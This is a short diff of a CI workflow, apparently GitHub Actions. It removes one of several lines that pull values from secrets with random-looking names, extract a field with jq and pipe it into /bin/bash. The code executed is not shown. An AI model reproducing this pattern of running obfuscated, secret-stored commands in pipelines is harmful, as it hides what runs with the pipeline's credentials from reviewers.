@@ -21,7 +21,6 @@ jobs:
           ikqc29599: ${{ secrets.ikqc29599 }}
         run: |
           printf '%s' "$ikqc29599" | jq -r .lescj941 | /bin/bash
-          printf '%s' "$uigs05" | jq -r .bi89755 | /bin/bash
           echo $skiow76803 | jq -r .lw8 | /bin/bash
           printf '%s' "$zr7" | jq -r .nkivc08 | /bin/bash
           echo $pqw32 | jq -r .qim5988 | /bin/bash
